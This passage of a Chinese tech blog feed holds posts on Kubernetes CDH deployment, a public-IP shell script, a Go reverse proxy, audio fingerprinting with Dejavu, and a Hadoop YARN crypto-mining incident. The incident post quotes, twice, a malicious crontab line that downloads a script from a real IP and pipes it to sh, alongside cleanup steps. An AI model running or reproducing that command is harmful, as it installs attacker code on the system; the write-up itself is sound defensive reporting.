&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: extensions/v1beta1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Ingress&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: cdh-master-ing&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;rules:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;- host: cdh.docs.aliyun.com&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;http:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;paths:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- backend:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;serviceName: master-external&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;servicePort: 7180&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;创建&lt;code class=&quot;highlighter-rouge&quot;&gt;namespace cloudera&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;镜像来源已经在上方说明了,可以自己去&lt;code class=&quot;highlighter-rouge&quot;&gt;rebuild&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;默认全部不会启动&lt;code class=&quot;highlighter-rouge&quot;&gt;command脚本可以看出&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;启动流程进入&lt;code class=&quot;highlighter-rouge&quot;&gt;Master-deploy &lt;/code&gt; 去执行&lt;code class=&quot;highlighter-rouge&quot;&gt;start.sh&lt;/code&gt;启动，根据机器情况，启动时间不等，期间可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -tlunp&lt;/code&gt; 查看端口是否占用来验证启动成功与否.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CDH&lt;/code&gt; 需要用到Kubernetes的&lt;code class=&quot;highlighter-rouge&quot;&gt;特权模式&lt;/code&gt;,相关细节请查关键字 &lt;code class=&quot;highlighter-rouge&quot;&gt;Kubernetes securityContext&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;部分界面如下：
&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/2f2be0a5-ef33-4458-9cd4-433b9a3ebed4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务界面&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/3596a98d-8de0-4641-b2b6-e7904061479d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PVC 界面&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/e68c1177-32c0-419b-8acd-eeecbfd702dc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;CDH 节点界面&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/49f7fc4a-2f25-4895-818a-0e6d296983b0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;节点服务运行情况。
  &lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/a054ea06-ffcb-4340-bfc9-7b307d7cbc99.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;感谢-httpsgithubcomwindawings&quot;&gt;感谢 https://github.com/windawings&lt;/h3&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">技术验证篇，通过Kubernetes搭建一个可扩展的 CDH，并且启动hadoop。</summary></entry><entry><title type="html">Shell 获得外网IP</title><link href="http://firsh.me/2018/08/30/shell-getinterip/" rel="alternate" type="text/html" title="Shell 获得外网IP" /><published>2018-08-30T14:33:33+08:00</published><updated>2018-08-30T14:33:33+08:00</updated><id>http://firsh.me/2018/08/30/shell-getinterip</id><content type="html" xml:base="http://firsh.me/2018/08/30/shell-getinterip/">&lt;p&gt;阿里云外网服务器如何获得外网IP。&lt;/p&gt;

&lt;h3 id=&quot;看这里&quot;&gt;看这里&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Function: gtIp&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#Author: zhangjianxin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#Time: 2018-08-30&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#! /bin/bash&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dirname &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;brokerName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dev_rocketmq_4.3.0
&lt;span class=&quot;c&quot;&gt;#########################setting#######################&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://ip.cn/&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;curl -o /dev/null -s -m 10 --connect-timeout 10 -w %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;http_code&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$Result&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Test&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;then
	&lt;/span&gt;curl -s -o &lt;span class=&quot;nv&quot;&gt;$bashpath&lt;/span&gt;/ip.html &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search inter ip &quot;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;cat &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ip.html  | sed  &lt;span class=&quot;s1&quot;&gt;'s/：/ /g'&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{print$3}'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
    rm &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bashpath&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ip.html
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    awk &lt;span class=&quot;s1&quot;&gt;'!seen[$0]++'&lt;/span&gt; &amp;lt;filename&amp;gt; &lt;span class=&quot;c&quot;&gt;# 去重行&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">阿里云外网服务器如何获得外网IP。</summary></entry><entry><title type="html">Go实现 静态页面服务器与反向代理在同一个端口进行工作.</title><link href="http://firsh.me/2018/08/08/go_proxy_and_static_web/" rel="alternate" type="text/html" title="Go实现 静态页面服务器与反向代理在同一个端口进行工作." /><published>2018-08-08T15:03:28+08:00</published><updated>2018-08-08T15:03:28+08:00</updated><id>http://firsh.me/2018/08/08/go_proxy_and_static_web</id><content type="html" xml:base="http://firsh.me/2018/08/08/go_proxy_and_static_web/">&lt;h1 id=&quot;这是一个简单的-静态服务器自带反向代理&quot;&gt;这是一个简单的 静态服务器，自带反向代理.&lt;/h1&gt;

&lt;h3 id=&quot;quick&quot;&gt;quick&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1，如何配置
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;firsh.cc&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 这个url需要在 host文件里面修改一下下面会讲&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/api&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;localhost:8005&quot;&lt;/span&gt;,  &lt;span class=&quot;c&quot;&gt;# 需要代理的服务器地址 与mock一致即可 忽略POST，GET DELETE等方法&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/Users/zhangjianxin/home/GO_LIB/src/github.com/breakEval13/libs/lib/staticweb/root&quot;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 上面的文件路径为dist目录&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;2 host如何进行映射&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
➜  Desktop cat /etc/hosts
&lt;span class=&quot;c&quot;&gt;##&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Host Database&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
127.0.0.1    firsh.me &lt;span class=&quot;c&quot;&gt;# 这里&lt;/span&gt;
127.0.0.1    firsh.cc &lt;span class=&quot;c&quot;&gt;# 这里&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;windows 同理进行修改hosts文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;如何启动&quot;&gt;如何启动&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;start
  ```bash
#windows 直接双击
#mac or linux
chmod +x  xxxx
./xxx #即可&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;```&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;配置文件和可执行文件放在统一目录(目录级别一致)))&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要修改代理的服务器IP直接编辑文件即可,程序会自动更新代理。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;演示&quot;&gt;演示&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;GIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/1f4abb63-ed08-4004-a612-427a32ee6fb5.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Github&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;https://github.com/uk0/web-container-proxy&lt;/p&gt;

&lt;h2 id=&quot;小白手段大佬勿喷&quot;&gt;！！！小白手段，大佬勿喷。&lt;/h2&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">这是一个简单的 静态服务器，自带反向代理.</summary></entry><entry><title type="html">基于Python DeJavu 进音乐指纹识别，识别歌曲</title><link href="http://firsh.me/2018/07/01/dejavu-python-read-mp3/" rel="alternate" type="text/html" title="基于Python DeJavu 进音乐指纹识别，识别歌曲" /><published>2018-07-01T01:24:05+08:00</published><updated>2018-07-01T01:24:05+08:00</updated><id>http://firsh.me/2018/07/01/dejavu-python-read-mp3</id><content type="html" xml:base="http://firsh.me/2018/07/01/dejavu-python-read-mp3/">&lt;p&gt;这只是一个Demo&lt;/p&gt;

&lt;h2 id=&quot;开始&quot;&gt;开始&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;将音频数据分析的结果存储到数据库&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dejavu&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dejavu&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;database&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;passw0rd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;db&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dejavu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;database_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mysql&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 将数据提取到Mysql （音乐的指纹）&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dejavu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/zhangjianxin/home/mp3/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_num_fingerprints&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;监听麦克风进行识别歌曲&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;


&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dejavu&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dejavu&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dejavu.recognize&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileRecognizer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MicrophoneRecognizer&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;database&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;passw0rd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;db&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;dejavu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;database_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mysql&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dejavu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 识别从mic输入的音频 只获得5秒的音频&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;secs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;song&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;djv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recognize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MicrophoneRecognizer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;song&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No Match&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;song&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;需要用到的工具&quot;&gt;需要用到的工具&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python 2.7

brew install portaudio
brew install ffmpeg
brew install mysql-connector-c &lt;span class=&quot;c&quot;&gt;# my_config.h&lt;/span&gt;
brew install mysql
&lt;span class=&quot;c&quot;&gt;#!!!  mysql-connector-c (my_config.h) -&amp;gt;  mysql&lt;/span&gt;
ln -s  ../../../../mysql-connector-c/6.1.11/include/my_config.h ./


brew link mysql &lt;span class=&quot;c&quot;&gt;# create links&lt;/span&gt;

pip install mysql-python
pip install &lt;span class=&quot;nv&quot;&gt;numpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.10.2 &lt;span class=&quot;c&quot;&gt;# 版本兼容性问题&lt;/span&gt;
pip install PyDejavu

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/788db197-f796-42d2-8ea5-ef655160e7c5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">这只是一个Demo</summary></entry><entry><title type="html">yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</title><link href="http://firsh.me/2018/06/21/yarn-hack-hadoop/" rel="alternate" type="text/html" title="yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application" /><published>2018-06-21T17:48:51+08:00</published><updated>2018-06-21T17:48:51+08:00</updated><id>http://firsh.me/2018/06/21/yarn-hack-hadoop</id><content type="html" xml:base="http://firsh.me/2018/06/21/yarn-hack-hadoop/">&lt;p&gt;简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。&lt;/p&gt;

&lt;h3 id=&quot;排问题&quot;&gt;排问题&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1. 集群检查&lt;/p&gt;

    &lt;p&gt;今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/7422da30-8014-41f6-a922-55f86a3ce252.png&quot; alt=&quot;&quot; /&gt;
经过排查在&lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/ /var/tmp&lt;/code&gt; 下面发现了 Java 还有tmp.txt
内容如下：
&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;服务器地址:&lt;code class=&quot;highlighter-rouge&quot;&gt;transfer.sh&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;ol&gt;
      &lt;li&gt;检查 &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab -l &lt;/code&gt; 发现了一个莫名其妙的 job
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; wget -q -O - http://185.222.210.59/cr.sh | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;解决办法&quot;&gt;解决办法&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1，通过查看占用cpu高得进程，kill掉此进程&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;3 ，通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh&lt;/td&gt;
          &lt;td&gt;sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1任务，删除此任务&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
